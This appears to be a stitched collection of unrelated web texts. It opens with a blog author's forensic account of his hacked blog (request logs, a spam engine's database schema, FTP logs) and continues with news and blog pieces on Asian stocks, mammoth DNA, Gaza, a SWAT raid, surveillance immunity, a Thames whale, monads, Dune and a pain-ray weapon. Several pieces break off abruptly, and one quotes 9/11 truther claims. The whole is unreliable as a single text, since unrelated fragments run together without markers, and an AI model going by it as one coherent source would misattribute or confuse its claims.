select * from request where request_id = 1857380 \G
***************************
1 . row ***************************
request_id : 1857380 request_url : http://justinsomnia.org/
request_referrer : http://fitis.google.com/rio/index.php?unit=adv_areas&sort_by=pr&sort_order=desc&page_n=1 request_date : 2007-07-03 13:36:22 request_user_agent : Mozilla /5.0 ( compatible ; Googlebot /2.1 ; + http://www.google.com/bot.html) request_ip : 62.140.244.24
The most interesting detail is the request_user_agent value .
But first some background .
The reason for building a request tracker in javascript ( rather than parsing server logs ) is that search engine bots do n’t parse JavaScript like a web browser does .
So that serves as a reliable way to filter out automated requests from the human ones I ’m interested in .
This also means that the Googlebot user agent should NEVER appear in my stats .
But sure enough , there it was , one minute after my blog ’s theme had been hacked .
Out of 1.9 million request records , only 70 ever identify as Googlebot ( usually people who ’ve changed their browser ’s user agent for testing purposes ) .
Then a day later , on July 4 , my homepage was requested from the same IP ( 62.140.244.24 ) , again with a user agent of “ Googlebot ” .
What this means is that someone was manually checking my site in their web browser , masquerading at the Googlebot , to see if their hack had succeeded .
Now let ’s take a look at the request_referrer value .
That ’s the URL of the webpage the person had in their browser when they clicked on a link pointing to http://justinsomnia.org/
( presumably out of a list of other hacked sites ) .
First of all , http://fitis.google.com/ does not exist .
That ’s probably there to make the request look like it ’s genuinely coming from Google .
It ’s very likely that they ’d simply mapped that hostname to localhost in /etc / hosts .
rio is presumably the name of an application for hacking sites and managing spam links .
index.php is just the standard filename , and everything else is the query string .
So I start Googling for a spamming application called “ rio ” or any occurrence of those query string variables in Google ’s Code Search .
Nada .
Until I searched for the inauspicious adv_areas value in Google proper , and struck veritable gold .
There were only two results for that seemingly generic variable .
The first of which was a mysql bug report containing what appears to be a partial database schema for an SEO hacking / spamming engine :
adv_pages_free | CREATE TABLE `adv_pages_free` ( `adv_page_id` int ( 11 ) NOT NULL default ' 0 ' , `randomized` int ( 11 ) unsigned default NULL , PRIMARY KEY ( `adv_page_id` ) , KEY `randomized` ( `randomized` , `adv_page_id` ) ) ENGINE=MyISAM DEFAULT CHARSET=latin1 adv_pages | CREATE TABLE `adv_pages` ( `adv_page_id` int ( 11 ) NOT NULL auto_increment , `hostid` int ( 11 ) NOT NULL default ' 0 ' , `uri` varchar ( 255 ) NOT NULL default '' , `industry_id` smallint ( 4 ) NOT NULL default ' 0 ' , `theme` varchar ( 255 ) default NULL , `filename` varchar ( 36 ) default NULL , `committed` timestamp NOT NULL default ' 0000 -00 - 00 00:00:00 ' , `commit_id` int ( 11 ) NOT NULL default ' 0 ' , `nlinks` int ( 11 ) NOT NULL default ' 0 ' , `keyword` text , PRIMARY KEY ( `adv_page_id` ) , UNIQUE KEY `uniq_page_id` ( `hostid` , `uri` ) , KEY `page_id1` ( `hostid` , `adv_page_id` , `uri` , `industry_id` ) ) ENGINE=MyISAM AUTO_INCREMENT=21777537 DEFAULT CHARSET=latin1 adv_areas | CREATE TABLE `adv_areas` ( `adv_page_id` int ( 11 ) NOT NULL default ' 0 ' , `area_id` tinyint ( 4 ) NOT NULL default ' 1 ' , `sentence_id` int ( 11 ) NOT NULL default ' 0 ' , `anchor_text` varchar ( 255 ) NOT NULL default '' , `promoted_id` int ( 11 ) NOT NULL default ' 0 ' , `promoted_type` tinyint ( 1 ) NOT NULL default ' 2 ' , `crawlMask` tinyint ( 4 ) NOT NULL default ' 0 ' , UNIQUE KEY `uniq_area_id` ( `adv_page_id` , `area_id` ) , KEY `promoted_id` ( `promoted_type` , `promoted_id` ) , KEY `promoted_type_2` ( `promoted_type` ) , KEY `promoted_type` ( `adv_page_id` , `promoted_type` , `area_id` ) ) ENGINE=MyISAM DEFAULT CHARSET=latin1 adv_hosts | CREATE TABLE `adv_hosts` ( `hostid` int ( 11 ) NOT NULL auto_increment , `hostname` varchar ( 255 ) default NULL , `rev_hostname` varchar ( 255 ) default NULL , `port` smallint ( 6 ) NOT NULL default ' 80 ' , `ip` varchar ( 50 ) default NULL , `classc` int ( 11 ) NOT NULL default ' 0 ' , `oldip` varchar ( 50 ) default NULL , `link_industry_id` int ( 11 ) default ' 18 ' , `g_known` tinyint ( 1 ) default ' 0 ' , `y_known` tinyint ( 1 ) default ' 0 ' , `m_known` tinyint ( 1 ) default ' 0 ' , `g_banned` tinyint ( 1 ) default ' 0 ' , `y_banned` tinyint ( 1 ) default ' 0 ' , `m_banned` tinyint ( 1 ) default ' 0 ' , `customized` tinyint ( 1 ) NOT NULL default ' 0 ' , `modified` datetime default NULL , PRIMARY KEY ( `hostid` ) , UNIQUE KEY `hostname` ( `hostname` , `port` ) , KEY `ip` ( `ip` ) , KEY `iphostid` ( `ip` , `hostid` ) , KEY `rev_host_name` ( `rev_hostname` ) ) ENGINE=MyISAM AUTO_INCREMENT=100404 DEFAULT CHARSET=latin1
You can interpret for yourself what you think the fields stand for , but it ’s the 3 in the adv_hosts table that stand out the most to me : g_banned , y_banned , and m_banned .
What else do G , Y , and M stand for these days other than Google , Yahoo , and Microsoft ?
Fields like “ theme ” , “ filename ” and “ nlinks ” ( number of links ? ) also are suspicious .
Note the AUTO_INCREMENT value for the adv_hosts page : 100,404 !
From that one could infer that as of July 16 , 2007 ( when the bug was reported ) , this guy had already hacked over 100 k sites , containing 21,777,537 defaced spam pages .
Stunning .
Later in the bug report he adds “ Unfortunately I can not provide database content . ”
Yeah , I bet you can’t .
That bug report contained one other incredible piece of information : the name of the reporter , whose Linked In profile and resume describe him as a Software Engineer at “ SEM Professionals , ” but who claims was not responsible for hacking my blog .
SEM , for the uninitiated , usually stands for “ Search Engine Marketing ” which for some ( e.g. black hats ) entails spamming or gaming search engines into increasing the rank of certain search results for their clients , through any means necessary it seems ( for more information , see : Search engine marketing and Search engine optimization in Wikipedia . )
Suddenly my circumstantial evidence was looking a lot less circumstantial .
Update : Information removed on March 12 , 2008 per note at top of post .
Here ’s where I figure out how it was done
Actually I ’m not 100 % sure .
Dreamhost does not believe my password was leaked last June when they experienced an FTP - related leak of 3500 passwords , though the time of the first intrusion ( July 3 ) coincides with other bloggers who discovered their sites hacked ( e.g. mezzoblue ) .
If not Dreamhost then the next likely culprit would be an unknown vulnerability in PHP or WordPress .
However cross referencing the timestamps of the hacked file updates with my http access log turned up nothing .
Finally this morning Dreamhost sent me justinsomnia.org ’s ftp access logs for the last 6 days which contained the smoking gun .
Remember the timestamps of the updated rq.txt ?
Aug 18 04:15 and Aug 20 11:05 .
Check out the timestamps of the two most recent entries at the top of the log :
jwatt ftpd23817 201.27.197.215 Mon Aug 20 11:05 - 11:05 ( 00:00 ) jwatt ftpd10510 83.170.6.133 Sat Aug 18 04:15 - 04:15 ( 00:00 ) jwatt ftpd31925 125.163.255.120 Wed Aug 15 17:47 - 17:47 ( 00:00 ) jwatt ftpd19135 125.163.255.120 Wed Aug 15 16:54 - 16:55 ( 00:00 )
At which point I disabled FTP ( which I never use ) , changed my passwords , and will shortly begin updating my software .
But first I had to post this .
Update :
You made it all the way through this post ?

SINGAPORE , Oct. 22 — Renewed concerns about the health of the American economy sent Asian stocks sharply lower today , and European stocks also registered declines in early trading .
Following a dramatic decline by stock prices in the United States on Friday — the 20th anniversary of the 1987 “ Black Monday ” stock market crash — investors in Asia sold off stocks on worries that the United States mortgage crisis would crimp demand among American consumers for Asia ’s exports .
Hong Kong ’s benchmark index of share prices fell by almost 3.3 percent , while in Japan the benchmark Nikkei 225 Stock Average dropped by more than 2.2 percent .
South Korean stocks fell by 3.25 percent .
Asia ’s smaller markets were also hard hit : stocks in the Philippines slid by roughly 4 percent .
In Europe during early trading , London ’s FTSE 100 was down 88 points , or 1.4 percent , but was trading off its lows .
The German DAX stock market index was down 1.3 percent , and the Paris market had fallen by around 1.8 percent .
Mammoths became extinct just a few thousand years ago
Enlarge Image
An international research team says the process should work on other extinct animals , allowing their genetics to be studied in detail for the first time .
The mammoth DNA was taken from the hair shaft which was long thought to be a poor source for the " life molecule " .
But the group tells Science magazine that the shaft 's keratin material slows degradation and limits contamination .
" The idea has been that all the DNA is in the root and that the shaft is DNA - void , or of much lower quality , " explained co-worker Dr Tom Gilbert from the University of Copenhagen , Denmark .
" This is why when we screened a whole load of mammoths , we thought we might be lucky if we took enough hair from one of them .
Basically , for every mammoth we tried , it worked .
That blew us away , " he told the BBC .
Hair and hooves
The traditional route to DNA in ancient samples is through bones and preserved muscle , but any genetic material usually falls apart very soon after death and is prone to contamination from bacteria .
Having a new route to large quantities of well - preserved DNA should be a real boon to scientific research , Gilbert and colleagues say .
A specimen of 25,000 - year - old mammoth hair
" The reason we think hair is so great comes down to the fact that as a structure , hair is made out of this material called keratin , " explained Dr Gilbert , who works out of Copenhagen 's Center for Ancient Genetics .
" It 's a kind of protein that in a very simplistic sense can be viewed as a plastic that the DNA gets embedded in and surrounded by and protected by . "
The scientists think the approach will also work for other items built from the durable protein , such as horns , nails , antlers , hooves and even feathers .
They say museum collections must hold countless specimens of recently extinct creatures from which researchers would love to get genetic information but had never bothered because they believed their DNA to be corrupted and beyond analysis .
Ice mummies
Gilbert and colleagues targeted the mammoths ' mitochondrial DNA , a special type of DNA frequently used to measure the genetic diversity of populations - how closely different groups of organisms are related to each other .
Where previously only two mammoth mitochondrial genomes had been published , the Science paper reports the production of 10 new ones , including one from the very first mammoth that was studied - the so - called Adams mammoth , which was found in 1799 and has been stored at room temperature for the last 200 years .
A number of " ice mummies " are known around the world
" There are also a lot of old bison and horse mummies turning up in the permafrost .
It 's not just animals , there are humans [ too ] ; there are a lot of mummies around the world with hair , ranging from Egypt , South America to the more cold , better - preserved ones in Greenland . "
Asked the classic question about whether it would be possible to clone any extinct creatures back into existence , Dr Gilbert said that even if the full genetic sequence of a mammoth could be retrieved , the technology did not currently exist to turn that biochemical information into a live animal .
Israel today entered the escalating Palestinian conflict between Hamas and Fatah fighters when it launched air strikes on Gaza .
Palestinian officials said an Israeli helicopter gunship had fired three missiles at Hamas buildings in the town of Rafah , leaving several people buried in the rubble .
The strikes were retaliation for Hamas militants firing rockets into Israel .
The rocket attacks , which caused no reported injuries , were interpreted by some as a Hamas attempt to broaden the internal conflict and unite Palestinians against the Israelis .
In the bloodiest day in Gaza since the latest violence erupted four days ago , Hamas gunmen shot at least five Fatah bodyguards dead and mistakenly ambushed a jeep carrying their own fighters , killing five people .
The ambush happened after policemen from the Fatah - allied Preventive Security Organisation arrested five Hamas men and were driving them through Gaza City .
Five Hamas men and two from Fatah were killed .
Earlier today , Hamas gunmen killed at least five Fatah guards when they attacked the Gaza home of Mr Abbas 's leading security chief .
The fighting at Rashid Abu Shbak 's house happened soon after mortars landed near the president 's Gaza office and gunmen attacked a Hamas position outside the interior ministry building .
A Fatah official said at least six security men , including one member of the presidential guard , had been killed and at least 15 others wounded .
Mr Abu Shbak was apparently not at his home at the time of the attack .
The unrelenting violence has left the two - month unity government of Hamas Islamists and the secular Fatah faction of the Palestinian president , Mahmoud Abbas , in tatters .
" What is happening in Gaza endangers not only the unity government but the Palestinian social fabric , the Palestinian cause and the Palestinian strategy as a whole , " the Palestinian negotiator Saeb Erekat said .
A spokesman for the al - Aqsa Martyrs Brigades militant group , part of Fatah , blamed Hamas for the violence .
" Hamas 's political leadership is participating in the assassination and murder of Fatah men , " Abu Qusai told Reuters .
Hamas blamed Fatah , saying the attack on Mr Abu Shbak 's home had begun when shots were fired from the house at a passing Hamas patrol .
Elsewhere , gunmen pounded the main headquarters of the Fatah - dominated preventive security service with mortar bombs , sparking another gun battle in that area .
The death toll from the four days of Gaza fighting now stands at 30 , with dozens more having been injured .
Radley Balko has a post up today about yet another example of SWAT team overkill , this time out of Akron , Ohio :
Georgette Prince was making a quick run to the store last Thursday morning for orange soda and lottery tickets — a venture that should have been an uneventful five - minute trip but became a terrifying 20 - minute ordeal .
The unsuspecting Prince was caught in the storm of a SWAT team raid that had her in fear for her life .
“ I thought I was going to be shot .
I thought I was going to die , ” Prince recalled over the weekend as she sat in the living room of her Grace Avenue home .
She said she was just stepping out the front door of Mr. Pantry , a Copley Road convenience store , when her world became a frantic , frightening blur of guns , shouts and shoves of helmeted , armored men with guns .
“ I did n’t know what was going on , ” Prince said .
What was happening was Operation Milkman , an investigation of a multimillion - dollar , multicounty shoplifting ring that led last Thursday morning to raids at nine businesses and the arrests of nearly two dozen people in Summit , Portage and Medina counties
That ’s right , a SWAT raid over a shoplifting investigation , and an innocent civilian and her son were caught in the middle :
“ I was holding the pop in my arms and was backing out the door , pushing it open with my back , ” Prince said .
“ The next thing I know , I ’m being shoved back into the store and someone is pointing a rifle at me , yelling at me to get back , get back and to get down on the floor . ”
With the rifle trained on her and an officer clad in helmet and body armor advancing toward her , Prince went to the floor face - down .
She said her hands were pulled behind her back and she was handcuffed .
“ I was crying and telling them my son was outside in the car , ” she said .
According to Prince , another customer , a man , ran toward the cooler when officers barged in and she saw the owner of the store at the counter .
“ He had a gun on his hip … , ” Prince said .
“ I was just hoping he did n’t do anything .
I was thinking if the owner made any kind of move , I was going to get killed .
“ They ( the officers ) kept yelling : ` Tell us where the guns and money are . ’
I was so scared . ”
Outside the store , Prince ’s son found himself in an equally frightening situation as he stared down the barrel of a rifle .
“ I was just sitting in the car waiting for my mom ” when a SWAT officer pointed a rifle at him , Davonte said .
“ He was looking at me through the rifle ’s scope and telling me to get out of the Jeep , get on the ground and put my hands behind my back , ” Davonte said .
Because , you see , a twelve year - old sitting in a car in front of a convenience store is obviously up to no good .
The response from the police is typical of what one sees in this situation :
After questioning the officers involved , the sheriff ’s office confirmed the Prince family ’s version of the day ’s events for the most part , but noted that standard entry procedures were followed .
“ We believe everything was done according to the book , ” said Keith Thornton , an inspector with the sheriff ’s office .
He stressed that officers “ did nothing wrong and followed protocol and procedure . ”
Capt . Richard Roach , who was at the scene as the tactical command leader , concurred with Thornton ’s assessment .
“ It was a standard SWAT entry , ” Roach said .
“ It is designed to be quick , loud and startling . ”
And startling it was , as Ms. Prince and her son can attest .
Leading has benefits .
Senator Dodd 's campaign communications director Hari Sevugan tells me that $ 150,000 in small contributions have poured into Dodd 's campaign in the past 24 hours , since his announcement that he will put a hold on -- and may even filibuster - - a foreign intelligence surveillance bill approved yesterday by the Senate Intelligence Committee .
Dodd objects to a provision that would grant immunity to the telecommunications companies that turned over their customers ' phone and e-mail records to the government 's warrantless surveillance program .
The companies have been hit with 40 pending lawsuits charging them with privacy violation .
Dodd has raised more small - dollar contributions in the last 24 hours than he did in the previous month .
Sevugan also says the number of visits to his website is up tenfold , as is the number of people registering their e-mail addresses there .
If Obama had done this , he would 've pulled in far more , yeah .
He pulls in far more just by sneezing .
But Obama is in another plane of existence .
For Dodd , this is pretty big .
And Hillary ?
Well , apparently her position on retroactive immunity for law - breaking phone companies is still being focus group tested , so it 'll be a while before we know where she stands on the issue .
Meanwhile , despite the idiotic blatherings of the Washington Post 's Shailagh Murray , fighting this bill would be worth far more to Dodd 's campaign than a week pretending to give a crap about some I owan 's prize hog .
Shit , all the campaigning in the world has n't put Dodd on the map .
This thing -- you know , fighting to restore our tattered Constitution -- very well might .

Back when I was a kid in the late 70s and early 80s , I loved the Usborne series of books about life in the future .
Now that I ’m living in the future , I ’m trying to find these old books and see how many of their predictions of life today came true .
The Usborne Guide to Computer and Video Games , which I pointed to in an earlier entry , was rather accurate in its predictions of what was in store for video and computer games .
The future home tech featured in Usborne ’s Future Cities : Homes and Living into the 21st Century ( whose cover appears below ) is n’t too far off the mark either ; most of it would be easily found at your local Best Buy .
One section in Future Cities is titled Computers in the Home .
It describes a home of future , as seen through the eyes of a British author dabbling in sci-fi in the late 1970s .
Here ’s its introduction :
Computers in the Home
The picture on the right takes you into the living room of a house in the future .
The basics will probably be similar — windo9ws , furniture , carpet and TV .
There will be one big change though — the number of electronic gadgets in use .
The same computer revolution which has resulted in calculators and digital watches could , through the 1980s and ’90s , revolutionise people ’s living habits .
Television is changing from a box to stare at into a useful two - way tool .
Electronic newspapers are already available — pushing the button on a handset lets you read ‘ pages ’ of news , weather , puzzles and quizzes .
TV - telephones should be a practical reality by the mid 1980s .
Xerox copying over the telephone already exists .
Combining the two could result in millions of office workers being able to work at home if they wish .
There is little need to work in a central office if a computer can store records , copiers can send information from place to place and people can talk on TV - telephones .
Many people may prefer to carry on working in an office with others , but for those who are happy at home , the savings in travelling time would be useful .
Even better would be the money saved on transport costs to and from work .
Pictured below is a scan of the two - page spread in which the Computers in the Home section appears .
It points out some features in a future home , most of which you might find in your own living room today .
Here ’s the accompanying text , with my commentary in italics :
Fears had been growing for the 16 - 18 ft ( 5 m ) northern bottle - nosed whale which came as far upstream as Chelsea .
But now rescuers searching the east London stretch of river hope the sighting was accurate and it will continue to swim downstream .
Experts feared the animal could put itself in danger by becoming beached .
Tony Woodley , of the British Divers Marine Life Rescue Group , said it was spotted by a member of public at around 2045 GMT in Greenwich .
" Our rescue boat is now in the area looking for it with our spotlights on and if we see it , we will check its health . "
The whale was spotted swimming past the Houses of Parliament
Teams had been becoming increasingly worried as there had been no sighting of the whale since 1815 GMT at Chelsea Bridge .
This latest development will give hope to the hundreds of thousands of people who have been following the progress of the whale , which is usually found in deep sea water .
It was first spotted at 0830 GMT on Friday by a man on a train and has since attracted massive public and media attention .
Crowds gathered along the riverbanks to witness the extraordinary spectacle .
But it soon became clear there was cause for concern , as the animal came within yards of the banks , almost beaching , and crashed into an empty boat causing slight bleeding .
It is a very long way from home and we do n't know why it has ended up here
Alison Shaw , London Zoo
Whale in pictures
He said if it appears thin , it may be coming in to die , and added : " In which case we will euthanize it and consider it a success because it has not caused more suffering . "
If well however , a system of pontoons will be used to try to refloat it by lifting it into a boat and taking it out to sea , he said .
" It is a very unusual thing and we have never done it before with a whale this size .
It might float , it might not . "
He added that the whale was damaging itself by coming ashore .
The RNLI say it is the first whale rescue on the Thames .
A spokesman said three whales were spotted east of the Thames Barrier on Thursday but only one managed to get upstream .
Alison Shaw , of the Marine and Freshwater Conservation Programme at London Zoo , said the northern bottle - nosed whale was usually found in groups of three to 10 .
She told the BBC News website : " This is extremely rare in British waters as they are normally found in deep waters in the North Atlantic .
" It is about 16 - 18 ft long , so is relatively mature .
It is a very long way from home and we do n't know why it has ended up here . "
The whales usually weigh about seven tonnes , which will complicate any rescue attempt , experts said .
Over the years dolphins and seals have been spotted in the Thames .
Sperm whales have been seen in the Thames Estuary and porpoises have feasted on fish near Vauxhall Bridge , in central London .
Hyperoodon ampullatus Adult length : 7 - 10 m ( 23-33ft ) Weight : 5.8 - 7.5 tonnes Diet : Squid , fish Habitat : Deep offshore waters Range : Arctic and North Atlantic Status : Lower risk , conservation dependent , protected since 1977 Distinctive feature : Bulbous forehead
Do you have any pictures or moving footage of the whale ?

ふむふむ。以下、だらだらと書きます。
結城も好きなことを毎日やっていますけれど、自分の場合には「好きなことを貫いて仕事にしていく」というのとは少しニュアンスが違うかも、と思いました。私はやりたいことがしょっちゅう変わるし、飽きっぽいので「貫いて」というのがまずできない。それから「好きなこと」はしているけれど「仕事」としてというよりは「アマチュアっぽく」やってる感じがいつもどこかでつきまとっています（それがいやなわけではない）。「好きなことをやって収入を得ている」とは思いますが、「私は、好きなことを貫いて仕事にしています」というのとは違う感じが（自分では）していますね。
逆説的に 「仕事を好きになろうとしている」というのはある。もっと近いのは「自分がやっていることを好きになろうとしている」という感じ。うん、この調子でいろいろパラフレーズしてみよう。たとえば…
せっかくやるなら、納得のいくようにやろうとする
大きなことも小さなことも、手を抜かないでやろうとする
全体像をつかもうと思う

Purdue researchers create 9/11 computer simulation David Edwards and Nick Juliano
Published : Wednesday June 20 , 2007 Print This Email This
More than five - and - a - half years have passed since terrorists toppled the World Trade Center , and questions still remain about how the buildings came down .
Researchers at Purdue University have created a computer model attempting to answer some of those questions .
The simulation found jet engine shafts from airlines flown into the World Trade Center " flew through the building like bullets , " according to an Associated Press vide report .
Flaming jet fuel cascaded through the tower stripping away fireproofing material and causing the building to collapse , the AP video reports .
" The weight of the aircraft 's fuel , when ignited , acted like a flash flood of flaming liquid , " according to the video .
However , the website TRUTHORLIES.ORG believes that the simulation " raises more questions then answers . "
Josh Reeves and Mike Swenson write , " The following statement was used in the Purdue simulation : ' The weight of the aircraft 's fuel , when ignited , acted like a flash flood of flaming liquid . '
This is a direct contradiction of the FEMA report ( which can be viewed HERE ) which stated : ' despite the huge fireballs caused by the two planes crashing into the WTC towers each with 10,000 gallons of jet fuel , the fireballs did not explode or create a shock wave that would have resulted in structural damage .'
The site also notes that " the National Science Foundation ( NSF ) , the agency that funded the Purdue study , is an agency whose board was appointed by George W. Bush and confirmed by the United States Senate , " and that its director , Dr. Arden L. Bement Jr. worked for employers such as General Electric Company , Battelle Northwest Laboratories , and DARPA ( the Defense Advanced Research Projects Agency ) , the agency responsible for the development of new technology for use by the military .
If you have an affinity for programming language theory ( as I do ) , and wander around the internet searching for topics of interest , eventually you will run into references to monads .
They ’re neither trivial , nor as complex as the dearth of proper explanations of them might suggest .
In a nutshell , they are the PLT manifestation of a concept from category theory , and abstract away propagation of results and side effects , without actually performing side effects or leaving a pure - functional paradigm .
Any attempt at description beyond that point tends to either
a ) get terribly botched * , or
b ) turn into a real category theory explanation , which most people do n’t have the background to understand easily
and for those reasons I will refrain from attempting further explanation myself .
I do n’t have confidence in my own ability to explain in a non-interactive medium , and I certainly do n’t have the mathematics background to formalize it .
The internet is littered with tutorials and explanations “ in laymen ’s terms ” of what monads are , what they are for , why we care , etc .
Every such tutorial I have started ( at least a dozen , probably several more – all highly recommended ) has either bored me to tears , struck me as completely inane , or simply confused me .
I had decided that I was simply going to have to learn abstract algebra and category theory in order to really get a handle on what they were , until a wonderful post appeared on LtU , linking to one of the earlier papers on monads .
The paper , by Philip Wadler , gives not only a clear explanation of what a monad is , but also provides a strong motivation for looking for monads , an approachable description of how they are derived from a practical point of view for use in a type system , and a number of useful , nontrivial examples .
Probably one of the most well - written academic papers I ’ve read .
You should be familiar with an ML - style type system and notation to understand the examples .
Or you need be be good at picking up such things on the fly .
Monads for Functional Programming .
Enjoy .
* The canonical example of a monad is for some reason the Maybe monad , though I do n’t know why – it ’s certainly a monad , but it ’s actually not the most intuitive first example .
Most of the monad explanations I found online immediately launch into using Maybe as an example of why monads are n’t hard .
They ’re not , but the example is usually provided far too early , without enough background , motivation , or explanation , making the reader simply feel like he or she is missing some greater complexity ( which is true ) which was already explained ( which usually is not the case ) .
Wadler ’s example of a simple interpreter is much clearer .
We had a good day at the beach .
Later we walked down to the pier .
There ’s been much blogosphere commentary on an article earlier this week from Rasmussen Reports showing that Hillary Clinton only leads Ron Paul by ten percentage points in the most recent , and first to my knowledge , head - to - head matchup poll between them .
Rasmussen contends that the poll says more about Clinton than it does about Paul :
First , because just about everyone in the United States has an opinion of Hillary Clinton .
She has been a major player on the national and international stage for 15 years .
Half the country has a favorable opinion of her and half holds the opposite view , but all have an opinion .
Our most recent survey results show that nearly 60 % of voters have a strongly held opinion about the New York Senator and former First Lady .
As for Ron Paul , 42 % do n’t know enough about him to have an opinion one way or the other .
He ’s one of 435 Congressman whose life is way below the radar screen for most Americans .
Still , his presence in the GOP Presidential Debates has raised his profile a bit–26 % now offer a favorable opinion and 32 % say the opposite .
But , only 16 % have a strongly held opinion about Paul ( 7 % Very Favorable , 9 % Very Unfavorable ) .
A look at the crosstabs demonstrates that it is attitudes towards Clinton that are driving the numbers in this polling match - up .
Among all voters , Clinton attracts 48 % support .
Among the voters who have never heard of Ron Paul or do n’t know enough to have an opinion , guess what .
Clinton attracts the exact same total – 48 % of the vote .
So whether or not people have heard of Ron Paul as the challenger , support for Clinton does n’t change .
Among the 51 % who have heard of Ron Paul but do n’t have a Very Favorable opinion of him , Clinton attracts 49 % of the vote .
The only noticeable difference to be found is among that very small slice of the electorate that has a Very Favorable opinion of Paul .
Seven percent ( 7 % ) of the nation ’s voters fit this description and they prefer the Texas Congressman over the Democratic frontrunner by a 70 % to 27 % margin .
Interestingly , Clinton ’s numbers against Paul are n’t all that different from the numbers she gets against any of the other Republican candidates .
But that is n’t all that surprising considering that we ’re still at an early point in the race , especially when it comes to talking about head - to - head matchups .
Of all the Presidential candidates on either side of aisle , Clinton comes into the race with the most baggage and the highest negatives .
So , when you put her up against a generic Republican , there ’s going to be a certain number of people who are going to pick the other guy .
But that does n’t mean much of anything at this point in the race , and , contrary to what some Paul supporters might think , it does n’t mean that he has any better of a chance to beat her than any of the other Republican candidates , or any chance at all ( take note — I do n’t think any Republican is going to be able to win in 2008 , so who ends up at the top of the ticket in ` 08 almost does n’t matter ) .
So , for you Hillary - haters out there , of which I am proudly one , this is n’t time to start celebrating .
That may not come until January 20 , 2017 .

Married men do less housework than live - in boyfriends , finds an international survey .
But married women do more housework than their live - in counterparts .
“ Marriage as an institution seems to have a traditionalizing effect on couples -- even couples who see men and women as equal , ” said co-researcher Shannon Davis , a sociologist at George Mason University in Virginia .
Understanding the dynamics of couples who live together but are not married has become more important as cohabitation around the globe increases .
More than 5 million unmarried partner households ( more than 10 million individuals ) currently exist in the United States , according to a 2006 report by the US Census Bureau .
" I do , " just not housework .
The scientists analyzed surveys gathered in 2002 from 28 nations , from 17,636 respondents ( 8,119 males and 9,517 females ) as part of the Family and Changing Gender Roles III Survey .
All respondents were either married or cohabiting with a significant other .
Overall , they found men spent about 9 hours a week on housework compared with women , who spent more than 20 hours weekly .
" There 's still a gender norm , since women do more housework than men regardless of union type , " said study team member Jennifer Gerteisen Marks , who is working on a doctorate degree at North Carolina State University .
Regardless of the couples ' relative earnings or work hours , cohabiting males reported more household hours than did their married counterparts , while the opposite was true for women , with wives picking up the broom less often than live - in girlfriends .
Equal partners
Other factors also came into play .
Men who raked in more earnings than their partners did fewer hours of housework than men with lower relative incomes .
" Those in the household with greater resources will leverage those resources to bargain their way out of housework , " the authors write in the September issue of the Journal of Family Issues .
Couples who viewed men and women as equals were more likely to divvy up chores equally .
But even in " egalitarian households , " married men still contributed less to household chores than did their wives .
" It 's consistent with prior research , which has shown that the roles of wives and husbands are very powerful , " Marks told LiveScience .
" In a cohabiting relationship there are n't such strongly prescribed social norms , which trickle down to things like housework . "
There may be little original in this post , but then , there seems to be little original in its subject .
It ’s just that , well , no one , or not many , manage to say the obvious .
I was sitting before my tv the other day watching Dune .
The SciFi Channel version , not that monstrosity from David Lynch–of the two , the former is far superior , because you can actually follow the story without wincing at the acting .
Now , for those not familiar with it , Dune by Frank Herbert is a groundbreaking science fiction novel about a desert planet that contains in its substance “ the greatest treasure of the universe ” , the fictional Spice , a quasi - hallucinogenic morphogenetic substance without which travel in this universe is impossible and the Empire , such as it is , will cease to be .
Hmm .
Sounds metaphorical to me , how about you ?
In any event , the planet , Dune , is peopled by a nomadic desert folk known as the Fremen , who , when roused , become the fanatical warriors for the messianic personality known as Muad ’Dib .
As I ’m watching , I listen to the second or third speech about how the Fremen have a prophecy about an off - world leader –the Mahdi–who will come to lead them against their enemies .
In the meantime , they collect water ( a precious commodity ) keep to themselves , and settle their differences among themselves with ritual combat and other related practices .
When questioned about this , the standard reply is “ It ’s our way . ”
And it occurred to me that the function of the Mahdi–and all other Messiahs–is to serve as a catalyst for change , to do the things unthnkable within a society , to lever a people out of their traditions and set them to change .
Something they could–and should –do for themselves .
Because none of these figures have ever done anything particularly special , other than to say what everyone–or at least many–are thinking but are too cowed by custom to say .
So they have prophecies about , essentially , some hapless goof who has the wisdom–or stupidity –to point out the exit from the temple and then have the audacity to tell everyone that they can leave .
For their moment of inspiration and trouble , they are usually killed –or coopted by the war faction to lead a jihad or something and do some killing , by which time a new order has taken root and customs are reestablished and immutable and the change brought by the messiah safely neutralized by all the bloodshed In The Name Of …
Custom can be a fine thing in its place , but when it chains people to misery and oppression because everyone is too afraid to point out the obvious , it becomes an abomination .
I ’m watching Dune and thinking , “ What the hell do you need a Mahdi for ?
You have a pretty good idea already what needs to be done , why do n’t you just go do it ? ”
In the case of Jesus , the Hebrews needed a Messiah to free them .
From what ?
They could travel throughout the Roman Empire if they wanted ( and had the money , something that was not a unique condition to them , having or not having ) .
In many ways , under Roman law , they were in fact freer than they had ever been under their own kings .
Free from the Roman heel ?
Well , the pros and cons are arguable , but a close reading of the New Testament suggests that in order for them to change culturally to exist peacefully , they needed a symbolic sacrifice that fulfilled the law , freeing them from Old Testament legalities that hamstrung them .
They were likely never going to get their country back the way it had been and pining for it was inhibiting them from trying something new .
( I ’m simplifying here to make a point . )
The messianic function Jesus performed was to tell them to , basically , get over themselves and start living a little .
They were n’t any better than Romans , Egyptians , Libyans , etc .
The thing they thought they had to have which put them at odds with Rome and made their lives miserable just was n’t that important .
Love one another .
For this , he was killed .
( Actually , he was killed for other reasons , but if you go to Sunday School , this is what we ’re told . )
And really , all these people already knew this .
They did n’t need a Messiah to tell them this .
But there seems to be a need for one idiot who will actually break the log jam and sort of grant permission for everyone to do the obvious .
The trouble with Mahdis and Messiahs is that those who follow them still do n’t do the work .
They substitue allegiance for moral growth .
They hand responsibility over to the Leader instead of figuring out just what the change signified is all about .
And they end up building a new power structure around the Mahdi that is every bit as constraining as the one he ’s supposedly freeing them from .
Of course , when you continue reading Herbert ’s Dune novels , this is exactly the point he makes .
It ’s not difficult to understand .
But damn , we still wo n’t wean ourselves off this whole Messiah idea .

" Where do I put my finger ?
There ... OK ?
Nothing 's happening ... is it on ? "
" Yes , it 's on .
Move your finger a bit closer . "
" Er ... ow ! OW ! "
Not good .
I try again .
" OWWW ! " I pull my hand away sharpish .
My finger is throbbing , but seems undamaged .
I was told people can take it for a second , maximum .
No way , not for a wimp like me .
I try it again .
It is a bit like touching a red - hot wire , but there is no heat , only the sensation of heat .
There is no burn mark or blister .
Its makers claim this infernal machine is the modern face of warfare .
It has a nice , friendly sounding name , Silent Guardian .
I am told not to call it a ray - gun , though that is precisely what it is ( the term " pain gun " is maybe better , but I suppose they would like that even less ) .
